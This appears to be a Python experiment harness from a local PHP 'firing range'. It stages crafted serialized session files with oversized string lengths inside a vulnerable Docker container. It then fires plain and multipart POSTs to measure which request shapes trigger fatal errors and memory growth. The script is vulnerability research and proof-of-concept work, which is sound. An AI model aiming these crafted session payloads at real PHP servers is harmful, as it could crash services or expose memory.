#!/usr/bin/env python3
"""smb_q1_grid.py — controlled grid: what actually fatals on :8151?

Variables: request shape (plain POST vs multipart), staged session content
(marker count), BIG size; stale-state cleared by restarting php first.
Track: HTTP status, staged file size after, php VmHWM (peak RSS) delta.
"""
import re
import subprocess
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q  # reuse mp_min/stage/docker_exec/helper


def vmhwm(kind):
    out = q.helper_read(kind, "grep -E 'VmHWM|VmRSS' /proc/$P/status")
    m = re.findall(r"(\d+) kB", out)
    return [int(x) for x in m]


def restart(kind):
    q.docker_exec(q.CT[kind], "pkill -f 'php -S' || true")
    t, last = q.healthy(q.VULN if kind == "vuln" else q.CTRL, deadline=15)
    time.sleep(0.5)


def plain_post(sid):
    import urllib.request
    req = urllib.request.Request(
        f"http://{q.VULN}/ping.php", data=b"message=ping",
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "Cookie": f"PHPSESSID={sid}"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return f"{r.status}"
    except urllib.error.HTTPError as e:
        return f"{e.code}"
    except Exception as e:
        return f"EXC {type(e).__name__}"


def stage(kind, sid, n_markers, big):
    if n_markers == 0:
        head = b'poc|a:2:{i:0;s:3:"abc";i:1;s:%d:"' % big
    else:
        mk = [b"MK%02d-%s" % (i, b"S" * (60 * (i + 1))) for i in range(n_markers)]
        head = b"".join(b"p%d|" % i + b's:%d:"' % len(mk[i]) + mk[i] + b'";'
                        for i in range(n_markers)) + \
               b'poc|a:2:{i:0;s:3:"abc";i:1;s:%d:"' % big
    h64 = subprocess.run(["base64", "-w0"], input=head,
                         capture_output=True).stdout.decode()
    t64 = subprocess.run(["base64", "-w0"], input=b'";}',
                         capture_output=True).stdout.decode()
    rc, out = q.docker_exec(q.CT[kind],
        f"F=/tmp/sess_{sid}; rm -f $F; echo {h64} | base64 -d > $F; "
        f"head -c {big} /dev/zero | tr '\\0' 'A' >> $F; "
        f"echo {t64} | base64 -d >> $F; "
        f"chown nobody:nobody $F; chmod 600 $F; wc -c < $F")
    return out


def filesize(kind, sid):
    rc, out = q.docker_exec(q.CT[kind], f"wc -c < /tmp/sess_{sid} 2>/dev/null")
    return out or "gone"


def run(label, kind, sid, n_markers, big, multipart=True):
    sz = stage(kind, sid, n_markers, big)
    h0 = vmhwm(kind)
    if multipart:
        st, dt = q.mp_min(q.VULN, sid)
    else:
        st, dt = plain_post(sid), 0.0
    h1 = vmhwm(kind)
    fs = filesize(kind, sid)
    print(f"{label:34s} st={st:24s} staged={sz:>9s} after={fs:>9s} "
          f"hwm {h0}->{h1} kB  ({dt:.2f}s)")


print("== grid: fresh restart first (clear any stale BG state) ==")
restart("vuln")
run("plainPOST 0mk 75MB (session_start)", "vuln", "g1a", 0, 75_000_000, multipart=False)
restart("vuln")
run("mp 0mk 75MB", "vuln", "g1b", 0, 75_000_000)
restart("vuln")
run("mp 1mk 75MB", "vuln", "g1c", 1, 75_000_000)
restart("vuln")
run("mp 12mk 75MB (wpbleed-exact)", "vuln", "g1d", 12, 75_000_000)
restart("vuln")
run("mp 12mk 200MB", "vuln", "g1e", 12, 200_000_000)
restart("vuln")
run("mp 12mk 60MB", "vuln", "g1f", 12, 60_000_000)
